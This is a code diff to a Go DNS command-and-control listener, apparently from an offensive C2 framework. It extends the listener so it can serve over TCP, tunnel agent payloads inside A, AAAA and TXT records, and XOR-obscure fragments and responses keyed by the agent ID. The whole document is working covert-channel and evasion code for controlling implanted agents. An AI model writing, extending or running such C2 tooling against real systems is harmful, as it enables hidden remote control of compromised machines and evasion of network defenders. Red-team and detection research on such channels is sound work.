@@ -47,15 +47,27 @@ type DNSBeaconListener struct {
 	Domain  string // e.g. "c2.example.com"
 	ID      uint   // listener DB ID
 	Addr    string // e.g. ":53" or ":5353"
-	server  *dns.Server
+	server   *dns.Server
+	tcpServer *dns.Server
 	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
 	AgentIP string
 	running bool
+
+	// obscure enables deterministic XOR obscuring of DNS fragments and
+	// responses, keyed by the agent UUID (which the server learns from the
+	// unobscured qname label). It must be enabled on both the agent and the
+	// listener or the C2 exchange will not decode.
+	obscure bool
 
 	fragMu  sync.Mutex
 	frags   map[string]*dnsFragState // agentID → assembly
 	stopGC  chan struct{}
 	fstopMu sync.Mutex
+}
+
+// SetObscure toggles DNS payload obscuring for this listener.
+func (dl *DNSBeaconListener) SetObscure(v bool) {
+	dl.obscure = v
 }
 
 // NewDNSBeaconListener creates a DNS C2 listener bound to addr (e.g. ":53").
@@ -94,6 +106,14 @@ func (dl *DNSBeaconListener) Start() error {
 		Handler: mux,
 	}
 
+	// Also serve DNS over TCP so agents configured with DNSTCP (or whose
+	// responses exceed the 512-byte UDP limit) can reach this listener.
+	dl.tcpServer = &dns.Server{
+		Addr:    dl.Addr,
+		Net:     "tcp",
+		Handler: mux,
+	}
+
 	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", dl.Addr)
 	go func() {
 		dl.Lock()
@@ -109,6 +129,11 @@ func (dl *DNSBeaconListener) Start() error {
 			dl.Lock()
 			dl.running = false
 			dl.Unlock()
+		}
+	}()
+	go func() {
+		if err := dl.tcpServer.ListenAndServe(); err != nil {
+			slog.Warn("DNS C2 TCP listener failed", "error", err)
 		}
 	}()
 	dl.startFragGC()
@@ -162,6 +187,9 @@ func (dl *DNSBeaconListener) Stop() error {
 		return nil
 	}
 	dl.running = false
+	if dl.tcpServer != nil {
+		_ = dl.tcpServer.Shutdown()
+	}
 	return dl.server.Shutdown()
 }
 
@@ -197,11 +225,18 @@ func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
 
 	switch q.Qtype {
 	case dns.TypeA:
-		dl.handleAType(w, r)
+		// A-record queries that target the beacon subdomain are tunneled C2
+		// responses; everything else is answered with the stub AgentIP so real
+		// DNS resolution still works through this listener.
+		if isBeaconQuery(qname, dl.Domain) {
+			dl.handleDNSQuery(w, r, rtA)
+		} else {
+			dl.handleAStub(w, r)
+		}
 	case dns.TypeTXT:
-		dl.handleDNSQuery(w, r, false)
+		dl.handleDNSQuery(w, r, rtTXT)
 	case dns.TypeAAAA:
-		dl.handleDNSQuery(w, r, true)
+		dl.handleDNSQuery(w, r, rtAAAA)
 	default:
 		m := new(dns.Msg)
 		m.SetReply(r)
@@ -209,7 +244,23 @@ func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
 	}
 }
 
-func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
+// recordType selects the response record family used to carry the C2 payload.
+const (
+	rtTXT  = 0
+	rtAAAA = 1
+	rtA    = 2
+)
+
+// isBeaconQuery reports whether qname targets the listener's beacon subdomain
+// (i.e. "<uuid>.dns.<domain>"), which distinguishes tunneled C2 traffic from
+// ordinary lookups that should get a stub answer.
+func isBeaconQuery(qname, domain string) bool {
+	domainLower := strings.ToLower(domain)
+	idx := strings.LastIndex(strings.ToLower(qname), ".dns."+domainLower)
+	return idx > 0
+}
+
+func (dl *DNSBeaconListener) handleAStub(w dns.ResponseWriter, r *dns.Msg) {
 	m := new(dns.Msg)
 	m.SetReply(r)
 	ip := net.ParseIP(dl.AgentIP)
@@ -223,10 +274,10 @@ func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
 	w.WriteMsg(m)
 }
 
-// handleDNSQuery processes beacon TXT or AAAA queries (useAAAA selects the
-// response record type). AAAA tunneling packs the same base64-encoded response
-// into 16-byte AAAA rdata chunks (the IPv6 address bytes are ASCII base64 text),
-// giving operators an alternative to TXT-based DNS C2.
+// handleDNSQuery processes beacon TXT, AAAA or A queries. AAAA tunneling packs
+// the same base64-encoded response into 16-byte AAAA rdata chunks (the IPv6
+// address bytes are ASCII base64 text), and A tunneling packs it into 4-byte A
+// rdata chunks, giving operators alternatives to TXT-based DNS C2.
 //
 // Query format (fragmented): <hex-uuid>.<total_index>.<base32frag>... .dns.<domain>
 //
@@ -241,7 +292,7 @@ func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
 //
 // Response: base64-encoded beaconResponse JSON, split into 255-char (TXT) or
 // 16-char (AAAA) chunks.
-func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, useAAAA bool) {
+func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, rt int) {
 	m := new(dns.Msg)
 	m.SetReply(r)
 
@@ -251,7 +302,7 @@ func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, us
 	domainLower := strings.ToLower(dl.Domain)
 	idx := strings.LastIndex(prefix, ".dns."+domainLower)
 	if idx < 0 {
-		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
+		addDNSRecord(m, r.Question[0].Name, "", rt)
 		w.WriteMsg(m)
 		return
 	}
@@ -259,7 +310,7 @@ func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, us
 	// Get everything before ".dns."
 	agentPart := prefix[:idx]
 	if agentPart == "" {
-		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
+		addDNSRecord(m, r.Question[0].Name, "", rt)
 		w.WriteMsg(m)
 		return
 	}
@@ -284,7 +335,7 @@ func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, us
 		if !complete {
 			// Still awaiting remaining fragments: acknowledge quietly with a
 			// blank record so the agent keeps sending without a hard failure.
-			addDNSRecord(m, r.Question[0].Name, "", useAAAA)
+			addDNSRecord(m, r.Question[0].Name, "", rt)
 			w.WriteMsg(m)
 			return
 		}
@@ -302,7 +353,7 @@ func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, us
 		}
 	}
 
-	dl.processBeacon(agentID, requestData, m, r, useAAAA)
+	dl.processBeacon(agentID, requestData, m, r, rt)
 	w.WriteMsg(m)
 }
 
@@ -345,6 +396,10 @@ func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []
 	frag, err := decodeBase32NoPad(combined)
 	if err != nil || len(frag) == 0 {
 		return nil, false, false
+	}
+	// Reverse the agent's XOR obscuring (keyed by the agent UUID) when enabled.
+	if dl.obscure {
+		frag = xorBytesServer(frag, []byte(agentID))
 	}
 
 	dl.fragMu.Lock()
@@ -393,9 +448,9 @@ func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []
 	return buf.Bytes(), true, true
 }
 
-func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg, useAAAA bool) {
+func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg, rt int) {
 	if dl.handler == nil {
-		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
+		addDNSRecord(m, r.Question[0].Name, "", rt)
 		return
 	}
 
@@ -409,14 +464,18 @@ func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m
 		reqJSON, err = json.Marshal(reqMap)
 		if err != nil {
 			slog.Error("Failed to marshal DNS request", "agent", agentID, "err", err)
-			addDNSRecord(m, r.Question[0].Name, "", useAAAA)
+			addDNSRecord(m, r.Question[0].Name, "", rt)
 			return
 		}
 	}
 
 	respJSON := dl.handler(agentID, reqJSON)
+	// Obscure the response payload (XOR keyed by the agent UUID) when enabled.
+	if dl.obscure {
+		respJSON = xorBytesServer(respJSON, []byte(agentID))
+	}
 	encoded := base64.StdEncoding.EncodeToString(respJSON)
-	addDNSRecord(m, r.Question[0].Name, encoded, useAAAA)
+	addDNSRecord(m, r.Question[0].Name, encoded, rt)
 }
 
 func addTXTRecord(m *dns.Msg, name string, value string) {
@@ -438,15 +497,41 @@ func addTXTRecord(m *dns.Msg, name string, value string) {
 	}
 }
 
-// addDNSRecord appends the response payload using either TXT or AAAA records,
-// depending on useAAAA. AAAA tunneling packs the base64 payload into 16-byte
-// AAAA rdata chunks; the trailing bytes of the final (padded) chunk are spaces,
-// which the agent strips before base64-decoding.
-func addDNSRecord(m *dns.Msg, name string, value string, useAAAA bool) {
-	if useAAAA {
+// addDNSRecord appends the response payload using TXT, AAAA or A records,
+// depending on rt. AAAA tunneling packs the base64 payload into 16-byte AAAA
+// rdata chunks and A tunneling into 4-byte A rdata chunks; the trailing bytes of
+// the final (padded) chunk are spaces, which the agent strips before
+// base64-decoding.
+func addDNSRecord(m *dns.Msg, name string, value string, rt int) {
+	switch rt {
+	case rtAAAA:
 		addAAAARecord(m, name, value)
-	} else {
+	case rtA:
+		addARecord(m, name, value)
+	default:
 		addTXTRecord(m, name, value)
+	}
+}
+
+// addARecord splits value into 4-byte (IPv4 rdata) chunks, each carrying a slice
+// of the ASCII base64 payload. Chunks shorter than 4 bytes are right-padded with
+// spaces so every A record is a valid 4-byte address.
+func addARecord(m *dns.Msg, name string, value string) {
+	if value == "" {
+		value = "    "
+	}
+	for i := 0; i < len(value); i += 4 {
+		end := i + 4
+		if end > len(value) {
+			end = len(value)
+		}
+		chunk := []byte("    ")
+		copy(chunk, value[i:end])
+		rr := &dns.A{
+			Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+			A:   net.IP(chunk),
+		}
+		m.Answer = append(m.Answer, rr)
 	}
 }
 
@@ -480,4 +565,17 @@ func decodeBase32NoPad(s string) ([]byte, error) {
 		s += strings.Repeat("=", pad)
 	}
 	return base32.StdEncoding.DecodeString(s)
+}
+
+// xorBytesServer applies a repeating-key XOR (its own inverse), mirroring the
+// agent-side dns obscure transform so both ends derive the identical payload.
+func xorBytesServer(data, key []byte) []byte {
+	if len(key) == 0 {
+		return data
+	}
+	out := make([]byte, len(data))
+	for i, b := range data {
+		out[i] = b ^ key[i%len(key)]
+	}
+	return out
 }
